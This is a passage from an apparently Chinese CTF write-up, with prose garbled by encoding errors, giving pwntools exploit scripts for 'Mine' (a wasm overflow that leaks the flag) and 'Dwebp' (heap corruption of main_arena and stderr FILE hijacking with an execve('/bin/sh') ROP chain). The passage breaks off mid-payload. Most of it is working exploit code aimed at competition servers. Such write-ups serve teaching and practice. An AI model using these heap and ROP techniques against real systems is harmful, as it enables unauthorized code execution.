</span></span><span class=line><span class=cl><span class=n>dropms</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;visit.&#34;</span><span class=p>,</span><span class=s2>&#34;6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Comments: &#34;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>backdoor</span><span class=p>)[:</span><span class=o>-</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mine-solved>Mine (Solved)</h2><p>Wasm pwnï¼Œå½“ä½¿ç”¨Uå¼€äº†ä¸€ä¸ªæ ¼å­ä¹‹åï¼Œè¾“å…¥é™¤äº†Uæˆ–Mçš„å­—æ¯ï¼Œå¯ä»¥æ›´æ”¹çŸ©é˜µçš„å†…å®¹ã€‚å½“ä¿®æ”¹åˆ°æœ€åä¸€è¡Œçš„å‰å››ä¸ªæ ¼å­çš„æ—¶å€™ä¼šäº§ç”Ÿæº¢å‡ºè¦†ç›–æ‰åŸå…ˆnameçš„æŒ‡é’ˆã€‚ç”±äºnameçš„åœ°å€å’Œflagçš„åœ°å€è¾ƒè¿‘ï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºä¿®æ”¹æœ€åä¸€ä½ä¸ºflagçš„åœ°å€ï¼Œç„¶ååœ¨è¾“å‡ºnameçš„æ—¶å€™å°±ä¼šæ³„éœ²flagã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;123.60.161.30&#34;</span><span class=p>,</span><span class=mi>10088</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./minesweeper&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;terminator&#39;</span><span class=p>,</span><span class=s1>&#39;-x&#39;</span><span class=p>,</span><span class=s1>&#39;sh&#39;</span><span class=p>,</span><span class=s1>&#39;-c&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your Name:&#34;</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;mark): &#34;</span><span class=p>,</span><span class=s2>&#34;0 0 U&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;mark): &#34;</span><span class=p>,</span><span class=s2>&#34;0 0 A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>15</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>sleep</span><span class=p>(</span><span class=mf>0.02</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;]:&#34;</span><span class=p>,</span><span class=s2>&#34;n&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;]:&#34;</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y &#34;</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0xb0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>15</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.02</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;]:&#34;</span><span class=p>,</span><span class=s2>&#34;n&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=dwebp-solved>Dwebp (Solved)</h2><p>å¯ä»¥ç›´æ¥éé¢„æœŸæ‰ï¼Œä½¿ç”¨webpè§£æå›¾ç‰‡çš„åŠŸèƒ½ä¸€å¯ä»¥ä¸ç”¨ï¼Œä½œè€…è‡ªå·±æ·»åŠ çš„æ¼æ´ä¸­å­˜åœ¨æœªåˆå§‹åŒ–æ¼æ´ã€‚å¯ä»¥é€šè¿‡ç”³è¯·è¶…å‡ºå¤§å°é™åˆ¶çš„å †å—æ¥å‘main_arenaä¸­å†™å…¥æ•°æ®ï¼Œå¯ä»¥ç›´æ¥å†™åˆ°IO_2_1_stderrä¸Šï¼Œexitçš„æ—¶å€™åŠ«æŒIOã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./dwebp&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;123.60.91.255&#34;</span><span class=p>,</span><span class=mi>10088</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./dwebp&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;terminator&#39;</span><span class=p>,</span><span class=s1>&#39;-x&#39;</span><span class=p>,</span><span class=s1>&#39;sh&#39;</span><span class=p>,</span><span class=s1>&#39;-c&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>meau</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;feedback?&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;feedback:&#34;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>adds</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;feedback?&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>meau</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;feedback:&#34;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x500</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x440</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x21B110</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base = &#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>adds</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>adds</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>adds</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x2a3e5</span>
</span></span><span class=line><span class=cl><span class=n>pop_rsi_ret</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x2be51</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdx_ret</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x170337</span>
</span></span><span class=line><span class=cl><span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x45eb0</span>
</span></span><span class=line><span class=cl><span class=n>syscall_ret</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x91316</span>
</span></span><span class=line><span class=cl><span class=n>mov_rsp_rdx_ret</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x5a120</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>IO_2_1_stderr</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stderr_&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>arena_addr</span> <span class=o>=</span> <span class=n>libc_base</span><span class=o>+</span><span class=mh>0x21b100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x21b120</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>6</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>59</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>syscall_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x21b138</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>rops</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xe0</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x21b1f0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>mov_rsp_rdx_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>320</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span><span class=mi>61</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>arena_addr</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>arena_addr</span> <span class=o>=</span> <span class=n>arena_addr</span><span class=o>+</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x21ac80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21000</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0xa7490</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1d9b11</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x2226d8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xffffffffffffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1e1300</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x217820</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x217d60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x217de0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x218660</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x217ba0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x217b20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x218320</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x218380</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x218400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x2184c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x218540</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x2185a0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1bf3c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1be4c0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1beac0</span><span class=p>)</span>
